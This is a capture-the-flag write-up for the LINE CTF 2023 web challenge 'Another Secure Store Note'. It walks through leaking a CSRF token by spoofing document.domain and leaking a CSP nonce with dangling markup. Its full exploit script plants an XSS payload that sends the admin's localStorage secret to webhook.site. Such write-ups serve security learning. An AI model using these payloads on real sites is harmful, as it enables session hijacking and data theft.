---
title: Another Secure Store Note - LINE CTF 2023
date: 2023-03-28 11:38:14
author: ma1f0y
author_url: https://twitter.com/mal_f0y
categories:
  - Web
tags:
  - LINECTF2023
---

**tl;dr**

+ Leak csrf token bypassing document.domain
+ visiting `/profile/` will not change the nonce 
+ Leak nonce using dangling markup in firefox 
+ Add XSS payload using the csrf to get the flag

<!--more-->

**Challenge Points**: 322
**No. of solves**: 7
**Solved by**: [ma1f0y](https://twitter.com/mal_f0y),[Lu513n](https://twitter.com/Lu513n)

## Challenge Description

Just a simple app to store notes.


## Analysis

The challenge was a simple application, which will store our secret in localStorage.Our goal was to get the flag which is stored in the admin's localStorage using xss.

Analyzing the source code of the app.
```javascript
const newCookie = rand()
db.cookies[newCookie] = Object.create(null)
db.cookies[newCookie].username = username
db.cookies[newCookie].csrf = rand()
db.cookies[newCookie].nonce = rand()
res.setHeader('Set-Cookie', `id=${newCookie}; HttpOnly; SameSite=None; Secure`)
res.redirect('/profile')
```
we can see that when we log in to the application it will create a cookie named id with a random value for us, and assign a random csrf token and random nonce to that corresponding cookie. And the site uses those csrf token and nonce in CSP to protect against CSRF and XSS

In profile.ejs which will be rendered when in `/profile` we have direct html injection using username.

```htmlembedded
  <div class=main>
      <h1>📕 <%- name %> secured notes 📕</h1>
      <div>
```


And there is getSettings.js which is used to set the csrf token into the page.


## Exploitation

We have to leak the CSRF token to change the admin's username and then only we can have HTML injection. To do so we can load the getSettings.js on our site and make it set the csrf token on the input feild on our site. But there is some check on the js which needs to bypass.

```javascript
if (isInWindowContext() && document.domain === '<%= domain %>') 
```

The `isInWindowContext()` will retrun true when the script is loaded in a window, so the only check valid is that document.domain should be the domain of the challenge site, we can easily bypass the check by defining the domain property on the document object from our site itself.

PoC: 
```html
<html>
    <body>
        <script>
            Object.defineProperty(document, 'domain', {get: () => "35.200.57.143"});
        </script>
        <input type="text" id="_csrf">
        <script src="https://35.200.57.143:11004/getSettings.js"></script>
        
    </body>
</html>
```

after getting the csrf token we can change the name to whatever html we want, But due to csp we can't get xss 

```javascript
const csp = (id && db.cookies[id] && db.cookies[id].nonce) ? `script-src 'nonce-${db.cookies[id].nonce}'` : '';  
res.setHeader('Content-Security-Policy', `default-src 'self'; base-uri 'self'; ${csp}`)
```


When we observe the profile page:
![](https://i.imgur.com/37en65Z.png)

After our injection point, we can see they are using single quotes in the type attribute of the script tag after the nonce attribute. So we can use [dangling markup injection](https://portswigger.net/web-security/cross-site-scripting/dangling-markup) to leak the nonce, using a  meta tag to redirect to our site and with an opening single quote that will close after the nonce part.

Actually, if we check
> Chrome blocks HTTP URLs with "<" or "\n" in it.

So our dangling markup will not work in chrome based browser. Luckily the challenge's admin bot was using **firefox** . So our exploit will work like a charm

![](https://i.imgur.com/ol50tSr.png)


Now we have the nonce but there is still a problem left, whenever the `/profile` page is loaded it contains an image tag with `csp.gif` as src, which is used to change the nonce each time after we load the page.

```javascript
app.get('/csp.gif', shouldBeLoggedIn, (req, res) => {
  db.cookies[req.cookies.id].nonce = rand()
  res.setHeader('Content-Type', 'image/gif')
  res.send('OK')
})
```

So if we get the nonce value from the page, we can't use it again , as the nonce will be changed when the csp.gif loads. So our aim is to somehow make the page doesn't load the csp.gif .

Another close observation of the page will give you the answer, the csp.js is using the relative path. So instead of visiting the profile file page using `/profile`  we can visit `/profile/`  and that will make the csp.js request to `/profile/csp.js`  which is not a valid endpoint. Thus csp will not change and we can reuse the csp we stole using dangling markup.

## Exploit script

```html
<script>
Object.defineProperty(document, 'domain', {get: () => "35.200.57.143"});
</script>
<form action="https://35.200.57.143:11004/profile" method=POST>
          <input class=change-name type=text name=name>
          <input type=text name=csrf id=_csrf>
          <input type=submit value=Submit>
</form>
<script src="https://35.200.57.143:11004/getSettings.js"></script>
<script>
(async () => {
    if(document.location.href.length<=60){
        document.getElementsByName('name')[0].value=`<meta http-equiv="refresh" content='0; url=http://webhook.site/?b=`;
        document.forms[0].submit();
        setTimeout(() => window.location='https://35.200.57.143:11004/profile/', 30);
    }
    else{
        var url = document.location.href;
        var nonce = url.split('nonce=')[1].split('%20')[0];
        var paylaod = `<script nonce=${nonce}>document.location='http://webhook.site/?b='+localStorage.getItem('secret');</`+`script>`;
        document.getElementsByName('name')[0].value=paylaod;
        document.forms[0].submit();
        setTimeout(() => window.location='https://35.200.57.143:11004/profile/', 50);
    }
})()
</script>
```

Host the script in the webhook server and change the url to your webhook server, Submit that url to the admin bot and get the flag !!.

## Flag

``LINECTF{72fdb8db303404e8388062c7233f248e}``
















